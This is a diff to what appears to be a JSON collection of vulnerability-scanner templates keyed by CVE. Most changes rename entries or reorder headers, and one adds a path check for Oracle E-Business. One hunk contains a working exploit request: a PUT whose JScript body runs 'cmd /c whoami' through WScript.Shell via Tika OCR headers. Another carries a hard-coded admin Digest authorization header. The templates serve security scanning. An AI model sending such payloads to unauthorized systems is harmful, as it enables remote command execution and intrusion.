@@ -6314,11 +6314,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -15356,8 +15356,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -17301,7 +17301,7 @@
     {
       "id": "CVE-2022-1040",
       "info": {
-        "name": "Sophos Firewall - RCE",
+        "name": "Sophos Firewall <=18.5 MR3 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17438,6 +17438,21 @@
       ]
     },
     {
+      "id": "CVE-2022-21500",
+      "info": {
+        "name": "Oracle E-Business - Login Panel Registration Accessible",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/OA_HTML/ibeCAcpSSOReg.jsp"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21705",
       "info": {
         "name": "OctoberCMS Authenticated Remote Code Execution",
@@ -17488,7 +17503,7 @@
     {
       "id": "CVE-2022-22954",
       "info": {
-        "name": "VMware Workspace ONE Access - Freemarker SSTI",
+        "name": "VMware Workspace ONE Access - Server-Side Template Injection",
         "severity": "critical"
       },
       "requests": [
@@ -17503,7 +17518,7 @@
     {
       "id": "CVE-2022-22963",
       "info": {
-        "name": "Spring Cloud Function SPEL RCE",
+        "name": "Spring Cloud - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17517,7 +17532,7 @@
     {
       "id": "CVE-2022-22965",
       "info": {
-        "name": "Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell)",
+        "name": "Spring Framework - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17793,7 +17808,7 @@
     {
       "id": "CVE-2022-26148",
       "info": {
-        "name": "Grafana Zabbix Integration - Credential Disclosure",
+        "name": "Grafana & Zabbix Integration - Credential Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -17837,7 +17852,7 @@
     {
       "id": "CVE-2022-26352",
       "info": {
-        "name": "DotCMS Arbitrary File Upload",
+        "name": "DotCMS - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -17928,7 +17943,7 @@
     {
       "id": "CVE-2022-29464",
       "info": {
-        "name": "WSO2 Management - Unrestricted Arbitrary File Upload & Remote Code Execution",
+        "name": "WSO2 Management - Arbitrary File Upload & Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17972,7 +17987,7 @@
     {
       "id": "CVE-2022-30525",
       "info": {
-        "name": "Zyxel Firewall - Unauthenticated RCE",
+        "name": "Zyxel Firewall - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
